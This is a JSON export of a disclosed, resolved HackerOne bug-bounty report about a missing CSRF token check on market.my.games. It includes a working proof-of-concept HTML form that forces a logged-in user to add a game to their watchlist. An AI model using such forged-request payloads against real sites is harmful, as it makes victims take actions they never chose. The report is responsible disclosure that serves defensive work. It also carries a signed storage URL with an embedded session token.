{
  "id": 802930,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MDI5MzA=",
  "url": "https://hackerone.com/reports/802930",
  "title": "CSRF on https://market.my.games",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2020-02-23T18:28:18.269Z",
  "submitted_at": "2020-02-23T18:28:18.269Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "naategh",
    "url": "/naategh",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/xxcg5T9sE1sDyfdoBemCjAuQ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 65,
    "url": "https://hackerone.com/mailru",
    "handle": "mailru",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Mail.ru",
      "twitter_handle": "",
      "website": "https://vk.company/",
      "about": "Building the Internet since 1998"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-04-06T12:43:14.812Z",
  "bug_reporter_agreed_on_going_public_at": "2020-03-24T09:40:44.035Z",
  "team_member_agreed_on_going_public_at": "2020-04-06T12:43:14.748Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Description\nHi team,\nWhile exploring https://market.my.games/ domain, I got this domain is vulnerable to CSRF. This site include an `X-CSRFToken` in headers but it seems the server doesn't validate it at all.\nMany endpoints require `application/json` as their `content-type` so we can't exploit this issue against them but I found `api/watchlist` endpoint doesn't require it so we can abuse this against this endpoint.\n\n## PoC\n- Save the following code as `ex.html` in your pc:   \n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://market.my.games/api/watchlist/37/\" method=\"POST\" enctype=\"text/plain\">\n      <input type=\"hidden\" name=\"null\" value=\"\" />\n      <input type=\"submit\" value=\"Go\" />\n    </form>\n  </body>\n</html>\n```\n- Go to https://account.my.games and login to your account\n- Open `ex.html` in your browser and click on `Go`\n- The game that assured to 37 will be added to your wishlist\n\n## Impact\n\nVulnerable endpoint it's not so sensitive, but an attacker can abuse this to add arbitrary games to users wishlist, so the impact of this is low, Also because it doesn't validate `X-CSRFToken` it's better to fix it.\nPlease note, I read your rules and I'm aware of \n> Reports of missed protection mechanism / best current practice (e.g. no CSRF token, framing/clickjacking protection) without demonstration of real security impact for user or system\n\nBut this endpoint require authentication that's why I think this is a valid report and it's better to fix it.\nBest regards,\n@Naategh",
  "weakness": {
    "id": 45,
    "name": "Cross-Site Request Forgery (CSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 726135,
      "file_name": "csrf.gif",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/PoUQE86aoe5wxrnxcphqi1HL?response-content-disposition=attachment%3B%20filename%3D%22csrf.gif%22%3B%20filename%2A%3DUTF-8%27%27csrf.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133835Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=056a51a1f83b37f44226c18336d7e0aafc4015be3588ad695b4b5b443c3d531b",
      "file_size": 4885725,
      "type": "image/gif",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2020-04-23T09:40:44.084Z",
  "allow_singular_disclosure_after": -120196671.0993774,
  "singular_disclosure_allowed": true,
  "vote_count": 8,
  "voters": [
    "tess",
    "k3ypt0",
    "eye_",
    "what_web",
    "frogzzz",
    "crius999",
    "5p1d3rr",
    "martinchoh10"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 40419,
    "asset_type": "OTHER",
    "asset_identifier": "Ext. B Scope",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 21124,
      "category": "team",
      "content": "CSRF token was not properly validated in some APIs of market.my.games",
      "user": {
        "id": 4836,
        "username": "3apa3a",
        "name": "Vladimir Dubrovin",
        "bio": "En la agostada senda he visto al buen lagarto (gota de cocodrilo) meditando. ",
        "cleared": false,
        "verified": false,
        "website": "https://3proxy.org/",
        "location": "Nizhny Novgorod, Russia",
        "created_at": "2014-04-10T22:08:47.745Z",
        "url": "https://hackerone.com/3apa3a",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
